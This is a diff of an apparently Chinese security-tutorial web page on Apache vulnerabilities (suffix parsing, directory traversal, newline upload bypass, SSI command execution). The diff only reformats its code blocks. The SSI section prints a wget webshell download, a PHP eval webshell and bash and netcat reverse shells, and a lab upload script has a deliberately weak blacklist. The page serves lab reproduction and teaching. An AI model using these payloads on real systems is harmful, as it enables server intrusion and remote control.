@@ -471,19 +471,12 @@
 <li>Application是最上层，也就是我们写的PHP代码了</li>
 </ul>
 <p>Apache本身是不支持PHP解析的,通过架构图我们可以知道是通过SAPI进行通信，那Apache如何和SAPI通信呢？Apache怎么知道什么类型的文件要解析为PHP？如果你手动搭建过Apache解析PHP的环境，就肯定了解这两个步骤：</p>
-<pre><code># 加载php5_module模块
-LoadModule php5_module php5apache2_2.dll的路径
-# 添加可以执行php的文件类型，让.php文件类型解析为PHP
-AddType application/x-httpd-php .php
-# 或者将AddType变为下面的(在Apache 2.4.0~2.4.29中默认使用了该方式)
-&lt;FilesMatch \.php$&gt;
-    SetHandler application/x-httpd-php
-&lt;/FilesMatch&gt;
-以及
-&lt;IfModule dir_module&gt;
-DirectoryIndex index.html index.htm index.php index.phtml
-&lt;/IfModule&gt;</code></pre><p>​    Apache通过LoadModule来加载php5_module模块（php5apache2_2.dll），这样做的目的是让Apache加载php5_module模块来解析PHP文件。意思其实就是用LoadModule来加载php5_module。也就是把php作为Apache的一个子模块来运行。当通过Web访问php文件时，Apache就会调用php5_module来解析php代码。<br>调用过程可以概括为</p>
-<pre><code>HTTP-&gt;Apahce-&gt;php5_module-&gt;sapi-&gt;php。</code></pre><h4 id="Apache-文件解析漏洞"><a href="#Apache-文件解析漏洞" class="headerlink" title="Apache 文件解析漏洞"></a>Apache 文件解析漏洞</h4><h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>​       Apache文件解析漏洞与用户的配置有密切关系，严格来说属于用户的配置问题。Apache文件解析漏洞涉及到一个解析文件的特性。Apache默认一个文件可以有多个以点分隔的后缀，当右边的后缀无法识别，则继续向左识别，发现后缀是php,交给php处理这个文件。</p>
+<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 加载php5_module模块</span></span><br><span class="line">LoadModule php5_module php5apache2_2.dll的路径</span><br><span class="line"><span class="meta"># 添加可以执行php的文件类型，让.php文件类型解析为PHP</span></span><br><span class="line">AddType application/x-httpd-php .php</span><br><span class="line"><span class="meta"># 或者将AddType变为下面的(在Apache 2.4.0~2.4.29中默认使用了该方式)</span></span><br><span class="line">&lt;FilesMatch \.php$&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">以及</span><br><span class="line">&lt;IfModule dir_module&gt;</span><br><span class="line">DirectoryIndex <span class="keyword">index</span>.html <span class="keyword">index</span>.htm <span class="keyword">index</span>.php <span class="keyword">index</span>.phtml</span><br><span class="line">&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure>
+
+<p>​    Apache通过LoadModule来加载php5_module模块（php5apache2_2.dll），这样做的目的是让Apache加载php5_module模块来解析PHP文件。意思其实就是用LoadModule来加载php5_module。也就是把php作为Apache的一个子模块来运行。当通过Web访问php文件时，Apache就会调用php5_module来解析php代码。<br>调用过程可以概括为</p>
+<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTTP-&gt;A<span class="function"><span class="title">pahce</span>-&gt;</span><span class="function"><span class="title">php5_module</span>-&gt;</span><span class="function"><span class="title">sapi</span>-&gt;</span>php。</span><br></pre></td></tr></table></figure>
+
+<h4 id="Apache-文件解析漏洞"><a href="#Apache-文件解析漏洞" class="headerlink" title="Apache 文件解析漏洞"></a>Apache 文件解析漏洞</h4><h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>​       Apache文件解析漏洞与用户的配置有密切关系，严格来说属于用户的配置问题。Apache文件解析漏洞涉及到一个解析文件的特性。Apache默认一个文件可以有多个以点分隔的后缀，当右边的后缀无法识别，则继续向左识别，发现后缀是php,交给php处理这个文件。</p>
 <h5 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>我们首先打开phpstudy，切换apache版本为5.2.17.</p>
 <p><img src="QQ%E6%88%AA%E5%9B%BE20200201102616.png" alt=""></p>
 <p>我们在本地网站根目录下新建文本文档写入任意字母。</p>
@@ -501,10 +494,10 @@ DirectoryIndex index.html index.htm index.php index.phtml
 <p><img src="QQ%E6%88%AA%E5%9B%BE20200201104231.png" alt=""></p>
 <p>那么我们在文件上传时就可以利用Apache的解析特性进行绕过</p>
 <h5 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>在httpd.conf或httpd-vhosts.conf中加入以下语句，从而禁止文件名格式为<em>.php.\</em>的访问权限：</p>
-<pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FilesMatch</span> <span class="token attr-name">".(php.|php3.|php4|php5.)"</span><span class="token punctuation">></span></span></span>
-Order Deny<span class="token punctuation">,</span>Allow
-Deny from all
-<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FilesMatch</span><span class="token punctuation">></span></span></span></code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">".(php.|php3.|php4|php5.)"</span>&gt;</span><br><span class="line">Order Deny,Allow</span><br><span class="line">Deny from all</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+
+
+
 <h4 id="Apache-目录遍历漏洞"><a href="#Apache-目录遍历漏洞" class="headerlink" title="Apache 目录遍历漏洞"></a>Apache 目录遍历漏洞</h4><h5 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p> 目录遍历（路径遍历）是由于web服务器或者web应用程序对用户输入的文件名称的安全性验证不足而导致的一种安全漏洞。使得攻击者通过利用一些特殊字符就可以绕过服务器的安全限制，访问任意的文件（可以是web根目录以外的文件），甚至执行系统命令。</p>
 <p>​      程序在实现上没有充分过滤用户输入的../之类的目录跳转符，导致恶意用户可以通过提交目录跳转来遍历服务器上的任意文件。</p>
 <h5 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>我们打开phpstudy.</p>
@@ -529,8 +522,8 @@ Deny from all
 <li>index.php（源文件缺少前台源码，已补全）</li>
 </ul>
 <p>执行构建环境命令如下（启动后在浏览器中访问<a href="https://link.zhihu.com/?target=http%3A//127.0.0.1%3A8080">http://127.0.0.1:8080</a>）</p>
-<pre class=" language-bash"><code class="language-bash">docker-compose build
-docker-compose up -d</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
 <h5 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h5><p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，<code>1.php\x0A</code>将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p>
 <h5 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h5><p>​        接下来通过实验的方式复现整个利用过程，首先先确认环境中的配置文件是否是&lt;FilesMatch .php$&gt;，路径为/etc/apache2/conf-available/docker-php.conf，该路径取决于apache2的目录，在搭建环境的时候不同apache版本路径可能不同，在Linux下的apache目录下执行grep -rn “FilesMatch” * 即可搜索到。<em>（在FilesMatch中的定义是将.php为后缀的文件解析为PHP，如果将其改为.(php|html)$的话，html中的php也会被解析。）</em><br>按照正常的漏洞利用步骤将其复现<br>0x01 抓包／改包<br>准备工作：将浏览器的代理打开、将burpsuit打开开启抓包。<br>访问漏洞页面<a href="https://link.zhihu.com/?target=http%3A//IP%3A8080/index.php">http://IP:8080/index.php</a>可以看到</p>
 <p><img src="https://pic1.zhimg.com/80/v2-17a95fd0f1c3533df7c1ec56c642cfd8_720w.jpg" alt="img"></p>
@@ -543,22 +536,8 @@ docker-compose up -d</code></pre>
 <p><img src="https://pic3.zhimg.com/80/v2-c5db07449b76d9786d7e0fc0a8daaca2_720w.png" alt="img"></p>
 <p>根据上图可以发现，move_uploaded_file函数已经被执行了，说明我们绕过了黑名单的检测，只不过在windows创建文件的时候由于结尾是换行符，windows不允许，所以创建失败了。</p>
 <p><strong>index.php源码</strong></p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">echo</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
-    <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'php'</span><span class="token punctuation">,</span> <span class="token string">'php3'</span><span class="token punctuation">,</span> <span class="token string">'php4'</span><span class="token punctuation">,</span> <span class="token string">'php5'</span><span class="token punctuation">,</span> <span class="token string">'phtml'</span><span class="token punctuation">,</span> <span class="token string">'pht'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">'bad file'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-    <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'./'</span> <span class="token punctuation">.</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-<span class="token delimiter">?></span>
-<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
-    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
-    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
-    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
-<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span></code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    $name = basename($_POST[<span class="string">'name'</span>]);</span><br><span class="line">	<span class="keyword">echo</span> $name;</span><br><span class="line">    $ext = pathinfo($name,PATHINFO_EXTENSION);</span><br><span class="line">    <span class="keyword">if</span>(in_array($ext, [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>, <span class="string">'pht'</span>])) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'bad file'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], <span class="string">'./'</span> . $name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form action=<span class="string">"index.php"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span> name=<span class="string">"name"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> value=<span class="string">"submit"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+
 <h4 id="Apache-SSI远程命令执行漏洞"><a href="#Apache-SSI远程命令执行漏洞" class="headerlink" title="Apache SSI远程命令执行漏洞"></a>Apache SSI远程命令执行漏洞</h4><p>转载：<a href="https://github.com/zhangzhenfeng/vulhub/tree/master/httpd/ssi-rce" target="_blank" rel="noopener">https://github.com/zhangzhenfeng/vulhub/tree/master/httpd/ssi-rce</a></p>
 <p><strong>影响版本</strong>：Apache全版本（支持SSI与CGI）</p>
 <p><strong>影响说明</strong>：绕过服务器策略，上传webshell</p>
@@ -569,20 +548,19 @@ docker-compose up -d</code></pre>
 <li>upload.php</li>
 </ul>
 <p>执行构建环境命令如下（启动后在浏览器中访问<a href="https://link.zhihu.com/?target=http%3A//127.0.0.1%3A8080">http://127.0.0.1:8080</a>）</p>
-<pre class=" language-text"><code class="language-text">docker-compose build
-docker-compose up -d</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
 <p><strong>漏洞原理</strong><br>SSI（server-side includes）:是放置在HTML页面中的指令，它可以将动态生成的内容添加到现有的HTML页面，而不必通过CGI程序或其他动态技术来提供整个页面。以上是定义采用在Apache官网对<a href="https://link.zhihu.com/?target=https%3A//httpd.apache.org/docs/2.4/howto/ssi.html">SSI的定义</a>，说白了就是可以在HTML中加入特定的指令，也可以引入其他的页面。开启SSI需要单独配置Apache，可以参考<a href="https://link.zhihu.com/?target=https%3A//httpd.apache.org/docs/2.4/howto/ssi.html">SSI配置</a>。<br>SSI可以完成查看时间、文件修改时间、CGI程序执行结果、执行系统命令、连接数据库等操作，功能非常强大。<br>我们要利用的就是SSI执行系统命令的功能，正常的一个包含SSI指令的文件，可以如下内容：</p>
-<pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pre</span><span class="token punctuation">></span></span></span>
-<span class="token markup"><span class="token comment" spellcheck="true">&lt;!--#exec cmd="whoami" --></span></span>
-<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pre</span><span class="token punctuation">></span></span></span></code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;!--<span class="comment">#exec cmd="whoami" --&gt;</span></span><br><span class="line">&lt;/pre&gt;</span><br></pre></td></tr></table></figure>
+
 <p>文件名保存为test.shtml，这个后缀取决于Apache的配置，默认是此后缀。<br>当后台对扩展名校验不严格时，可以上传此类型文件，达到执行命令，获取webshell的目的。执行效果：</p>
 <p><img src="https://pic1.zhimg.com/80/v2-ebadded85bd12ddb13481a3cf4d86d80_720w.jpg" alt="img"></p>
 <p>上传webshell：</p>
-<pre class=" language-text"><code class="language-text"><!--#exec cmd="wget http://xxx/shell.txt | rename shell.txt shell.php" -->
-echo '<?php @eval($_POST[margin]);?>' > shell.php</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd&#x3D;&quot;wget http:&#x2F;&#x2F;xxx&#x2F;shell.txt | rename shell.txt shell.php&quot; --&gt;</span><br><span class="line">echo &#39;&lt;?php @eval($_POST[margin]);?&gt;&#39; &gt; shell.php</span><br></pre></td></tr></table></figure>
+
 <p>反弹shell：</p>
-<pre class=" language-text"><code class="language-text"><!--#exec cmd="/bin/bash -i > /dev/tcp/192.168.0.118/8888 0<&1 2>&1" -->
-<!--#exec cmd="nc x.x.x.x 8888 -e /bin/bash"--></code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd&#x3D;&quot;&#x2F;bin&#x2F;bash -i &gt; &#x2F;dev&#x2F;tcp&#x2F;192.168.0.118&#x2F;8888 0&lt;&amp;1 2&gt;&amp;1&quot; --&gt;</span><br><span class="line">&lt;!--#exec cmd&#x3D;&quot;nc x.x.x.x 8888 -e &#x2F;bin&#x2F;bash&quot;--&gt;</span><br></pre></td></tr></table></figure>
+
 <h5 id="漏洞复现：-1"><a href="#漏洞复现：-1" class="headerlink" title="漏洞复现："></a>漏洞复现：</h5><p>正常上传PHP文件是不允许的，我们可以上传一个shell.shtml文件：</p>
 <p><a href="https://github.com/zhangzhenfeng/vulhub/blob/master/httpd/ssi-rce/1.png" target="_blank" rel="noopener"><img src="https://github.com/zhangzhenfeng/vulhub/raw/master/httpd/ssi-rce/1.png" alt="img"></a></p>
 <p>成功上传，然后访问shell.shtml，可见命令已成功执行：</p>
